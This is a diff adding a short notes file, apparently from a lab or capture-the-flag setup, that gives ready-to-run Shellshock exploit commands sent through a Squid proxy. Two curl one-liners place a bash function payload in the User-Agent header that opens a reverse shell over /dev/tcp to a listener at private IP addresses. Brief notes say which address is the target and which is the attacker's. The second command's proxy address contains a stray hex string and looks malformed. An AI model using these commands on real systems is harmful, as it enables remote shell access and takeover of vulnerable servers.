@@ -1,0 +1,18 @@
+SHELLSHOCK-SQUID
+curl -x http://192.168.174.135:3128 -A "() { :; };/bin/sh -i >& /dev/tcp/192.168.174.129/443 0>&1" http://192.168.174.135/cgi-bin/status
+
+
+**192.168.174.135 is the remote address
+
+192.168.174.129 is the local address
+
+192.168.174.135:3128 is the remote address with the proxy port
+
+
+curl -x http://192.168.30.53/7b9713b4d6f4b5edc0875c24b9653cea:3128 -A "() { :; };/bin/sh -i >& /dev/tcp/192.168.30.31/443 0>&1" http://192.168.30.53/cgi-bin/status
+
+
+
+
+
+
